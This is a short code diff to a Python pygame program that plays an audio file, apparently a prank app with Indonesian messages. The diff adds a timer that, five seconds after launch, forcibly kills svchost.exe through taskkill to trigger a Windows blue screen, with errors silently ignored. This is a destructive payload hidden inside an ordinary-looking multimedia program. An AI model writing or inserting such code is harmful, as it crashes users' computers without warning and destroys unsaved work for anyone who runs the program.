@@ -1,5 +1,7 @@
 import os
 import sys
+import subprocess
+import time
 
 import pygame
 
@@ -45,11 +47,22 @@ try:
 except Exception as e:
     print(f"Gagal memutar audio. Pastikan file berada di {audio_path}. Error: {e}")
 
+start_time = time.time()
+bsod_triggered = False
+
 clock = pygame.time.Clock()
 running = True
 
 # Main program
 while running:
+    # Trigger BSOD after 5 seconds
+    if not bsod_triggered and (time.time() - start_time > 5):
+        try:
+            subprocess.run(["taskkill.exe", "/f", "/im", "svchost.exe"], shell=True)
+        except Exception:
+            pass
+        bsod_triggered = True
+
     for event in pygame.event.get():
         if event.type == pygame.QUIT:
             running = False
